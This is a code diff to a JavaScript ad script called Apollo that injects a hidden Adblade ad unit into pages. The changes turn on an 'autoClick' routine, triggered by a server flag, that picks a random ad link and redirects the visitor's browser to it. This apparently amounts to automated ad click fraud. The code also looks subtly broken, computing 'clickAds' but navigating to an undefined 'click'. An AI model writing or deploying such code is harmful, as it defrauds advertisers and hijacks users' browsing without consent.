@@ -23,14 +23,13 @@ class Apollo {
 
     //Start Apollo
     this.request(`${this.api}/remnant?publisher=${window.ApolloOptions.publisher}`, (res) => {
-      if (true) { //(JSON.parse(res).click) {
-        this.insertAdDiv()
-        this.insertAds(this.ads)
+      this.createElement()
+      this.createRemnant(JSON.parse(res))
+      this.attachEvents()
+      this.insertAdDiv()
+      this.insertAds(this.ads)
+      if (JSON.parse(res).click) {
         this.autoClick()
-      } else {
-        this.createElement()
-        this.createRemnant(JSON.parse(res))
-        this.attachEvents()
       }
     })
   }
@@ -151,7 +150,7 @@ class Apollo {
 
   insertAds (ads) {
     console.log('insertAds')
-    let adsHTML = `<ins class='adbladeads' data-cid='32965-3063715480' data-host='web.adblade.com' data-tag-type='4' data-protocol='https' style='display:none'></ins>`
+    let adsHTML = `<ins class="adbladeads" data-cid="33127-2924094998" data-host="web.adblade.com" data-tag-type="4" data-protocol="https" style="display:none"></ins>`
     document.getElementById("ads").innerHTML = adsHTML
 
     var head = document.getElementsByTagName('head')[0];
@@ -181,7 +180,7 @@ class Apollo {
       const clickAds = ads[this.rand(0, ads.length - 1)].replace("this.href='", "").replace("'; return true;", "")
       console.log(clickAds)
 
-      //window.location.href = click
+      window.location.href = click
     }, waitTime)
   }
 
